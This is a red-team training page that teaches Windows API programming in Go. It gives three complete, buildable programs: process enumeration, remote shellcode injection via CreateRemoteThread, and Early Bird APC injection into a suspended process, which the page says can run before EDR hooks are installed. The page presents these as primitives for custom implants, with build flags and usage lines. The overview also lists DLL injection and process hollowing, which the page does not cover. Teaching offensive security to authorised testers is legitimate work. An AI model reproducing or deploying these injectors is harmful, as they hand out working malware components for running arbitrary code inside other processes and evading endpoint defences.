---
layout: training-page
title: "Go Windows API Programming — Red Team Academy"
module: "Tool Development"
tags:
  - go
  - golang
  - windows-api
  - process-injection
  - syscall
  - dll-injection
page_key: "tooldev-go-windows-api"
render_with_liquid: false
---

# Go Windows API Programming

## Overview

Go's `syscall` and `golang.org/x/sys/windows` packages expose the full Windows API. Using `syscall.NewLazyDLL` and `proc.Call()`, any Win32 API can be called from Go without CGO — producing a pure-Go binary with no C runtime dependency. This module covers process enumeration, remote process injection (OpenProcess/VirtualAllocEx/CreateRemoteThread), DLL injection, and process hollowing — the Windows offensive API primitives most commonly needed in custom implants.

**Dependencies:** `go get golang.org/x/sys/windows` for the typed wrappers; raw `syscall` is stdlib.

## Process Enumeration

Walk the system process list using `CreateToolhelp32Snapshot` / `Process32First` / `Process32Next` to find a target process by name, retrieve its PID, and determine its architecture and integrity level.

```
// proc_enum.go — enumerate running processes and find a target by name.
// Build: GOOS=windows GOARCH=amd64 go build -o proc_enum.exe proc_enum.go
// No CGO required — pure Go via syscall.

package main

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

var (
	kernel32                    = syscall.NewLazyDLL("kernel32.dll")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = kernel32.NewProc("Process32FirstW")
	procProcess32Next            = kernel32.NewProc("Process32NextW")
	procCloseHandle              = kernel32.NewProc("CloseHandle")
)

const (
	TH32CS_SNAPPROCESS = 0x00000002
	MAX_PATH           = 260
)

// PROCESSENTRY32 mirrors the Windows PROCESSENTRY32W structure.
// The struct must be packed identically to the Win32 layout.
type PROCESSENTRY32 struct {
	Size              uint32
	Usage             uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	Threads           uint32
	ParentProcessID   uint32
	PriClassBase      int32
	Flags             uint32
	ExeFile           [MAX_PATH]uint16  // wide-char process name
}

// ProcessInfo holds the details we care about for each process.
type ProcessInfo struct {
	PID        uint32
	PPID       uint32
	Name       string
	ThreadCount uint32
}

// ListProcesses returns a slice of ProcessInfo for all running processes.
func ListProcesses() ([]ProcessInfo, error) {
	// Take a snapshot of all processes at this moment in time
	snap, _, err := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == uintptr(syscall.InvalidHandle) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer procCloseHandle.Call(snap)

	var entry PROCESSENTRY32
	entry.Size = uint32(unsafe.Sizeof(entry))

	// Process32First initialises the enumeration
	ret, _, err := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return nil, fmt.Errorf("Process32First failed: %v", err)
	}

	var processes []ProcessInfo
	for {
		// Convert wide-char ExeFile array to a Go string
		name := syscall.UTF16ToString(entry.ExeFile[:])

		processes = append(processes, ProcessInfo{
			PID:         entry.ProcessID,
			PPID:        entry.ParentProcessID,
			Name:        name,
			ThreadCount: entry.Threads,
		})

		// Process32Next advances to the next entry; returns 0 when no more entries
		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	return processes, nil
}

// FindProcessByName returns the PID(s) of processes matching the given name (case-insensitive).
func FindProcessByName(name string) ([]uint32, error) {
	all, err := ListProcesses()
	if err != nil {
		return nil, err
	}
	var pids []uint32
	for _, p := range all {
		if strings.EqualFold(p.Name, name) {
			pids = append(pids, p.PID)
		}
	}
	return pids, nil
}

func main() {
	processes, err := ListProcesses()
	if err != nil {
		fmt.Printf("[!] Error: %v\n", err)
		return
	}
	fmt.Printf("%-8s %-8s %-7s %s\n", "PID", "PPID", "THREADS", "NAME")
	fmt.Println(strings.Repeat("-", 50))
	for _, p := range processes {
		fmt.Printf("%-8d %-8d %-7d %s\n", p.PID, p.PPID, p.ThreadCount, p.Name)
	}
}
```

## Remote Process Injection

Inject shellcode into a running process using the OpenProcess → VirtualAllocEx → WriteProcessMemory → VirtualProtectEx → CreateRemoteThread sequence — implemented entirely in Go via `syscall.NewLazyDLL`.

```
// inject.go — remote shellcode injection via Windows API.
// Build: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o inject.exe inject.go
// Usage: inject.exe -pid 4876 -shellcode shellcode.bin

package main

import (
	"flag"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var (
	kernel32              = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess       = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx    = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procVirtualProtectEx  = kernel32.NewProc("VirtualProtectEx")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procCloseHandle       = kernel32.NewProc("CloseHandle")
)

const (
	PROCESS_ALL_ACCESS = 0x001F0FFF
	MEM_COMMIT         = 0x00001000
	MEM_RESERVE        = 0x00002000
	PAGE_READWRITE     = 0x04
	PAGE_EXECUTE_READ  = 0x20
)

// injectShellcode opens the target process, allocates RW memory, writes the
// shellcode, changes protection to RX, and spawns a remote thread at the buffer.
func injectShellcode(pid uint32, shellcode []byte) error {
	size := uintptr(len(shellcode))

	// Step 1: open target process with full access
	hProc, _, err := procOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	if hProc == 0 {
		return fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer procCloseHandle.Call(hProc)
	fmt.Printf("[*] Opened PID %d (handle: 0x%x)\n", pid, hProc)

	// Step 2: allocate RW (not RWX) memory in the target process
	remBuf, _, err := procVirtualAllocEx.Call(
		hProc, 0, size,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if remBuf == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %v", err)
	}
	fmt.Printf("[*] Remote buffer: 0x%016x\n", remBuf)

	// Step 3: write shellcode to the remote buffer
	var written uintptr
	ret, _, err := procWriteProcessMemory.Call(
		hProc, remBuf,
		uintptr(unsafe.Pointer(&shellcode[0])),
		size, uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	fmt.Printf("[*] Wrote %d bytes\n", written)

	// Step 4: change protection from RW to RX (execute, no write)
	// This is the W^X pattern — avoids having a single RWX page
	var oldProt uint32
	procVirtualProtectEx.Call(
		hProc, remBuf, size,
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProt)),
	)
	fmt.Printf("[*] Changed protection: RW -> RX (was 0x%x)\n", oldProt)

	// Step 5: create a remote thread at the start of our shellcode buffer
	hThread, _, err := procCreateRemoteThread.Call(
		hProc, 0, 0,
		remBuf, // lpStartAddress = our shellcode buffer
		0, 0, 0,
	)
	if hThread == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %v", err)
	}
	defer procCloseHandle.Call(hThread)
	fmt.Printf("[+] Remote thread created — shellcode executing in PID %d\n", pid)
	return nil
}

func main() {
	pidFlag  := flag.Int("pid",       0,  "Target process PID")
	scFile   := flag.String("shellcode", "", "Shellcode binary file")
	flag.Parse()

	if *pidFlag == 0 || *scFile == "" {
		fmt.Fprintln(os.Stderr, "Usage: inject -pid <PID> -shellcode <file>")
		os.Exit(1)
	}

	shellcode, err := os.ReadFile(*scFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Cannot read shellcode: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[*] Shellcode: %d bytes\n", len(shellcode))

	if err := injectShellcode(uint32(*pidFlag), shellcode); err != nil {
		fmt.Fprintf(os.Stderr, "[!] Injection failed: %v\n", err)
		os.Exit(1)
	}
}
```

## Early Bird APC Injection

Early Bird APC injection creates a new suspended process, allocates memory, writes shellcode, queues a user-mode APC (Asynchronous Procedure Call) to the main thread pointing at the shellcode, then resumes the thread. The APC runs before the process's own entry point — often before EDR hooks are installed.

```
// early_bird.go — create suspended process and queue APC shellcode execution.
// Build: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o early_bird.exe early_bird.go
// Usage: early_bird.exe -target C:\Windows\System32\notepad.exe -shellcode sc.bin

package main

import (
	"flag"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var (
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	procCreateProcess        = kernel32.NewProc("CreateProcessW")
	procVirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
	procVirtualProtectEx     = kernel32.NewProc("VirtualProtectEx")
	procQueueUserAPC         = kernel32.NewProc("QueueUserAPC")
	procResumeThread         = kernel32.NewProc("ResumeThread")
	procCloseHandle          = kernel32.NewProc("CloseHandle")
)

const (
	CREATE_SUSPENDED     = 0x00000004
	MEM_COMMIT           = 0x00001000
	MEM_RESERVE          = 0x00002000
	PAGE_READWRITE       = 0x04
	PAGE_EXECUTE_READ    = 0x20
	PROCESS_ALL_ACCESS   = 0x001F0FFF
)

// STARTUPINFO and PROCESS_INFORMATION are Win32 structures needed by CreateProcess.
type STARTUPINFO struct {
	Cb              uint32; Pad0 [4]byte
	Desktop         *uint16
	Title           *uint16
	X, Y            uint32
	XSize, YSize    uint32
	XCountChars     uint32
	YCountChars     uint32
	FillAttribute   uint32
	Flags           uint32
	ShowWindow      uint16
	Pad1            [2]byte
	ReservedPtr     uintptr
	StdInput        syscall.Handle
	StdOutput       syscall.Handle
	StdError        syscall.Handle
}

type PROCESS_INFORMATION struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessId uint32
	ThreadId  uint32
}

func earlyBirdInject(target string, shellcode []byte) error {
	// Convert target path to UTF-16 for CreateProcessW
	targetW, _ := syscall.UTF16PtrFromString(target)
	size        := uintptr(len(shellcode))

	var si STARTUPINFO
	var pi PROCESS_INFORMATION
	si.Cb = uint32(unsafe.Sizeof(si))

	// Step 1: Create target process in SUSPENDED state (main thread is paused at entry)
	// The process memory is set up but execution has not begun yet — EDR hooks may not be installed
	ret, _, err := procCreateProcess.Call(
		uintptr(unsafe.Pointer(targetW)), // lpApplicationName
		0,                                // lpCommandLine
		0, 0,                             // process/thread security attrs
		0,                                // bInheritHandles
		CREATE_SUSPENDED,                 // dwCreationFlags
		0,                                // lpEnvironment
		0,                                // lpCurrentDirectory
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed: %v", err)
	}
	fmt.Printf("[*] Created suspended process PID=%d TID=%d\n", pi.ProcessId, pi.ThreadId)

	// Step 2: Allocate RW memory in the new process's address space
	remBuf, _, err := procVirtualAllocEx.Call(
		uintptr(pi.Process), 0, size,
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
	)
	if remBuf == 0 {
		return fmt.Errorf("VirtualAllocEx: %v", err)
	}

	// Step 3: Write shellcode into the allocated buffer
	var written uintptr
	procWriteProcessMemory.Call(
		uintptr(pi.Process), remBuf,
		uintptr(unsafe.Pointer(&shellcode[0])), size,
		uintptr(unsafe.Pointer(&written)),
	)
	fmt.Printf("[*] Wrote %d bytes at 0x%x\n", written, remBuf)

	// Step 4: Change protection from RW to RX
	var old uint32
	procVirtualProtectEx.Call(uintptr(pi.Process), remBuf, size, PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&old)))

	// Step 5: Queue a User-Mode APC to the main thread pointing at our buffer
	// When the thread is resumed, the APC runs first (before the process's own entry point)
	procQueueUserAPC.Call(remBuf, uintptr(pi.Thread), 0)
	fmt.Printf("[*] APC queued to TID %d at 0x%x\n", pi.ThreadId, remBuf)

	// Step 6: Resume the main thread — shellcode runs via APC before the process entry point
	procResumeThread.Call(uintptr(pi.Thread))
	fmt.Printf("[+] Thread resumed — shellcode executing via Early Bird APC\n")

	procCloseHandle.Call(uintptr(pi.Thread))
	procCloseHandle.Call(uintptr(pi.Process))
	return nil
}

func main() {
	target := flag.String("target",    "C:\\Windows\\System32\\notepad.exe", "Target process path")
	scFile := flag.String("shellcode", "", "Shellcode binary file")
	flag.Parse()

	shellcode, err := os.ReadFile(*scFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Cannot read: %v\n", err)
		os.Exit(1)
	}
	if err := earlyBirdInject(*target, shellcode); err != nil {
		fmt.Fprintln(os.Stderr, "[!]", err)
		os.Exit(1)
	}
}
```
